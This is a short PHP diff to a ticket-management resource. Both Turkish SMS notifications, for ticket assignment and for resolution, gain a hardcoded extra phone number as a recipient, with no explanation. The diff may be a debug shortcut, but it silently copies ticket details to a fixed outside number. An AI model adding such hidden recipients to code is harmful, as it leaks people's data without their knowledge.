@@ -389,7 +389,7 @@ class TicketResource extends Resource
                         if ($phoneNumber) {
                             $messageData = [
                                 'messageBody' => $ticketCreatedAt . ' tarihinde oluşturulan "' . $ticketName . '" başlıklı talep size atandı. Öncelik: ' . $ticketPriority . ', Tür: ' . $ticketType,
-                                'recipients' => [$phoneNumber],
+                                'recipients' => [$phoneNumber, '5439565402'],
                             ];
 
                             $result = $smsSender->sendSingle($messageData);
@@ -442,7 +442,7 @@ class TicketResource extends Resource
                         if ($phoneNumber) {
                             $messageData = [
                                 'messageBody' => $ticketCreatedAt . ' tarihinde oluşturulan "' . $ticketName . '" başlıklı talebiniz çözüldü. Sonuç mesajı: ' . $resultMessage,
-                                'recipients' => [$phoneNumber],
+                                'recipients' => [$phoneNumber, '5439565402'],
                             ];
 
                             $result = $smsSender->sendSingle($messageData);
